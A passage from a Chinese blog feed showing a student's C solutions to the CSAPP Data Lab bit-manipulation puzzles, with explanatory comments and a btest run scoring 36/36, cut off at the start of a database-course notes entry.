title="5. negate"></a>5. negate</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="comment">// 求负数得操作是取反加一</span></span><br><span class="line">  <span class="comment">// 取反：1111 1111 - x = -1 -x</span></span><br><span class="line">  <span class="comment">// 加一：(-1 - x) + 1 = -x</span></span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6. isAsciiDigit"></a>6. isAsciiDigit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="comment">// 如果 x &gt;= 0x30 &amp;&amp; x &lt;= 0x39</span></span><br><span class="line">  <span class="comment">// 那么 x - 0x30 &gt;= 0, x - 0x39  &lt;= 0</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// x - 0x30 &gt;= 0, x - 0x39 - 1 &lt; 0</span></span><br><span class="line">  <span class="comment">// 又 -0x30 = ~0x30 + 1, -0x39 = ~0x39 + 1</span></span><br><span class="line">  <span class="comment">// 即 (x + ~0x30 + 1) &gt;&gt; 31 = 0, (x + ~0x39) &gt;&gt; 31 = -1  </span></span><br><span class="line">  <span class="comment">// 注意：c语言右移补符号位(坑死我了)</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> judgeUpper = (x + ~<span class="number">0x39</span>) &gt;&gt; <span class="number">31</span>; </span><br><span class="line">  <span class="type">int</span> judgeLower = (x + ~<span class="number">0x30</span> + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> !(~judgeUpper | judgeLower); <span class="comment">//当且仅当judgeUpper为-1而且judgeLower为0时,返回true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7. conditional"></a>7. conditional</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> &#123;</span><br><span class="line">  <span class="comment">// 先得到x的布尔值：0或者1：x = !!x</span></span><br><span class="line">  <span class="comment">// 全0或全1会更好处理，全0就是0，全1是-1</span></span><br><span class="line">  <span class="comment">// 取反加一得相反数：x = ~x + 1 </span></span><br><span class="line"></span><br><span class="line">  x = ~(!!x) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (x &amp; y) | (~x &amp; z);  <span class="comment">//确实很牛逼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8. isLessOrEqual"></a>8. isLessOrEqual</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">  <span class="comment">// 跟isAsciiDigit差不多</span></span><br><span class="line">  <span class="comment">// x &lt;= y 得 x - y &lt;= 0  得 x + ~y &lt; 0 得(x + ~y) &gt;&gt; 31 = -1</span></span><br><span class="line">  <span class="comment">// 当 x 和 y 同号时 两数相减不会出现溢出 异号则会 所以需要判断符号</span></span><br><span class="line">  <span class="type">int</span> flag = (x ^ y) &gt;&gt; <span class="number">31</span>; <span class="comment">// x y同号时，flag = 00..00 否则为 11..11</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当 x 和 y 同号时</span></span><br><span class="line">  <span class="type">int</span> signEq = !~((x + ~y) &gt;&gt; <span class="number">31</span> );  <span class="comment">// 满足 x &lt;= y 时 signEq = 1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当 x 和 y 不同号时，y是正数时返回true</span></span><br><span class="line">  <span class="type">int</span> signNeq = !(y &gt;&gt; <span class="number">31</span>);           <span class="comment">// 满足 x &lt;= y 时 signNeq = 1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当 flag = 00..00，flag &amp; signEq = signEq, ~flag &amp; signNeq = 0, 结果为signEq</span></span><br><span class="line">  <span class="comment">// 当 flag = 11..11，flag &amp; signEq = 0, ~flag &amp; signNeq = signNeq, 结果为signNeq</span></span><br><span class="line">  <span class="keyword">return</span> (~flag &amp; signEq) | (flag &amp; signNeq); <span class="comment">// 受conditional的启发，很牛逼(再次)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9. logicalNeg"></a>9. logicalNeg</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 0要变成1，直接加一呗</span></span><br><span class="line">  <span class="comment">// 其他数要变成0，还得跟上述操作兼容qwq</span></span><br><span class="line">  <span class="comment">// 思路：有一个操作能使0变成0，除了0的其他所有数变成-1，得到的结果再加一</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当x不为0时, x | -x 符号为一定为1, 再右移31位得到-1</span></span><br><span class="line">  <span class="comment">// 当x为0时, x | -x = 0, 右移31位还是0</span></span><br><span class="line">  <span class="keyword">return</span> ((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10. howManyBits"></a>10. howManyBits</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="comment">// 101 表示 -4+2+1 = -3, 1101表示 -8+4+2+1 = -3, 11101表示 -16+8+4+2+1 = -3</span></span><br><span class="line">  <span class="comment">// 由此可见, 在负数的补码前面加很多位1, 得到的值是一样的, </span></span><br><span class="line">  <span class="comment">// 同理, 去掉前面重复的1，所表达的值也是一样的</span></span><br><span class="line">  <span class="comment">// 因此, 负数找最高位0就能确定需要多少位就能表达这个数</span></span><br><span class="line">  <span class="comment">// 总之：正数找最高位1，负数找最高位0</span></span><br><span class="line">  <span class="type">int</span> b_0, b_1, b_2, b_4, b_8, b_16;</span><br><span class="line">  <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>; </span><br><span class="line">  x = (~sign &amp; x) | (sign &amp; ~x); <span class="comment">// 正数负数统一处理, 转化为找x的最高位1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 别人的办法真是十分巧妙啊（</span></span><br><span class="line">  b_16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;  <span class="comment">// b_16 = (高16位有1)? 16 : 0</span></span><br><span class="line">  x = x &gt;&gt; b_16;            <span class="comment">// 高16位有1就继续看高16位, 没有就看后面的</span></span><br><span class="line">  b_8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;    <span class="comment">// 同理 b_8 = (高8位有1)? 8 : 0</span></span><br><span class="line">  x = x &gt;&gt; b_8;</span><br><span class="line">  b_4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;    </span><br><span class="line">  x = x &gt;&gt; b_4;</span><br><span class="line">  b_2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;    </span><br><span class="line">  x = x &gt;&gt; b_2;</span><br><span class="line">  b_1 = !!(x &gt;&gt; <span class="number">1</span>);         </span><br><span class="line">  x = x &gt;&gt; b_1;</span><br><span class="line">  b_0 = x;                  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> + b_0 + b_1 + b_2 + b_4 + b_8 + b_16;  <span class="comment">// 1 是符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="11-floatScale2"><a href="#11-floatScale2" class="headerlink" title="11. floatScale2"></a>11. floatScale2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">  <span class="comment">// 单精度浮点数32位 符号位1 指数位8 数值位23</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取符号, 铁定用的着</span></span><br><span class="line">  <span class="type">int</span> filter = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> sign = uf &amp; filter ; </span><br><span class="line">  <span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 先判断传入的值是否为非规格化值, 进行特殊处理</span></span><br><span class="line">  <span class="comment">// 只看指数位：(filter &gt;&gt; 8) ^ filter = 0111 1111 1000 00..</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = (((filter &gt;&gt; <span class="number">8</span>) ^ filter) &amp; uf) &gt;&gt; <span class="number">23</span>;   </span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">exp</span>)</span><br><span class="line">    <span class="keyword">return</span> (uf &lt;&lt; <span class="number">1</span>) | sign;  <span class="comment">// 指数为为0, 可以向指数为1平滑转化, 太绝了</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line"></span><br><span class="line">  ++<span class="built_in">exp</span>;                      <span class="comment">// 指数+1就是把值乘2</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span> == <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> ((filter &gt;&gt; <span class="number">8</span>) ^ filter) | sign; <span class="comment">// 判断越界</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取数值位</span></span><br><span class="line">  val = ~(filter &gt;&gt; <span class="number">8</span>) &amp; uf;</span><br><span class="line">  <span class="keyword">return</span> sign | (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-floatFloat2Int"><a href="#12-floatFloat2Int" class="headerlink" title="12. floatFloat2Int"></a>12. floatFloat2Int</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">  <span class="comment">// 同上, 先判断非规格化值</span></span><br><span class="line">  <span class="type">int</span> filter = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// int sign = uf &amp; filter;</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = (((filter &gt;&gt; <span class="number">8</span>) ^ filter) &amp; uf) &gt;&gt; <span class="number">23</span>;</span><br><span class="line">  <span class="type">int</span> val, sign;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exp</span> = <span class="built_in">exp</span> - <span class="number">127</span>;  <span class="comment">// 添加bias </span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span> &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span> &gt; <span class="number">31</span>)</span><br><span class="line">    <span class="keyword">return</span> filter;  <span class="comment">// 超过int范围的数按要求返回0x800..00u 包括inf和NaN</span></span><br><span class="line"></span><br><span class="line">  val = (~(filter &gt;&gt; <span class="number">8</span>) &amp; uf) | (<span class="number">1</span> &lt;&lt; <span class="number">23</span>); <span class="comment">// 取数值位, 加上隐藏的1</span></span><br><span class="line">  <span class="comment">// 这里的val已经是1.*** 小数点向右移了23位的结果了, 因此只需要再向右移exp - 23 位</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span> &gt; <span class="number">23</span>)</span><br><span class="line">    val = val &lt;&lt; (<span class="built_in">exp</span> - <span class="number">23</span>);</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    val = val &gt;&gt; (<span class="number">23</span> - <span class="built_in">exp</span>); </span><br><span class="line"></span><br><span class="line">  <span class="comment">// 负数用补码表示</span></span><br><span class="line">  sign = filter &amp; uf;</span><br><span class="line">  <span class="keyword">if</span>(!sign)</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">return</span> ~val + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-floatPower2"><a href="#13-floatPower2" class="headerlink" title="13. floatPower2"></a>13. floatPower2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="comment">// 求2^x = 1.0 * 2^x, 数值部分为0, 指数部分为x</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// float 不能超过 2^127</span></span><br><span class="line">  <span class="comment">// x过大使超过浮点数表示范围时, 按要求返回inf = 0x7f800000</span></span><br><span class="line">  <span class="comment">// x过小按要求返回0</span></span><br><span class="line">  <span class="keyword">if</span>(x &gt; <span class="number">127</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x7f800000</span>;</span><br><span class="line">  <span class="keyword">if</span>(x &lt; <span class="number">-126</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ((x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>) ; <span class="comment">// 注意加上bias = 127</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/datalab-handout# ./dlc bits.c</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/datalab-handout# make clean</span><br><span class="line">rm -f *.o btest fshow ishow *~</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/datalab-handout# make ./btest</span><br><span class="line">gcc -O -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.c</span><br><span class="line">btest.c: In function ‘test_function’:</span><br><span class="line">btest.c:334:23: warning: ‘arg_test_range’ may be used uninitialized [-Wmaybe-uninitialized]</span><br><span class="line">  334 |     if (arg_test_range[2] &lt; 1)</span><br><span class="line">      |         ~~~~~~~~~~~~~~^~~</span><br><span class="line">btest.c:299:9: note: ‘arg_test_range’ declared here</span><br><span class="line">  299 |     int arg_test_range[3]; /* test range for each argument */</span><br><span class="line">      |         ^~~~~~~~~~~~~~</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/datalab-handout# ./btest</span><br><span class="line">Score   Rating  Errors  Function</span><br><span class="line"> 1      1       0       bitXor</span><br><span class="line"> 1      1       0       tmin</span><br><span class="line"> 1      1       0       isTmax</span><br><span class="line"> 2      2       0       allOddBits</span><br><span class="line"> 2      2       0       negate</span><br><span class="line"> 3      3       0       isAsciiDigit</span><br><span class="line"> 3      3       0       conditional</span><br><span class="line"> 3      3       0       isLessOrEqual</span><br><span class="line"> 4      4       0       logicalNeg</span><br><span class="line"> 4      4       0       howManyBits</span><br><span class="line"> 4      4       0       floatScale2</span><br><span class="line"> 4      4       0       floatFloat2Int</span><br><span class="line"> 4      4       0       floatPower2</span><br><span class="line">Total points: 36/36</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS145 Intro to databases 学习笔记5——递归查询、OLAP、NoSQL</title>
      <link href="/2024/02/02/CS145%20Intro%20to%20databases%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%E2%80%94%E2%80%94%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2%E3%80%81OLAP%E3%80%81NoSQL/"/>
      <url>/2024/02/02/CS145%20Intro%20to%20databases%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%E2%80%94%E2%80%94%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2%E3%80%81OLAP%E3%80%81NoSQL/</url>
      
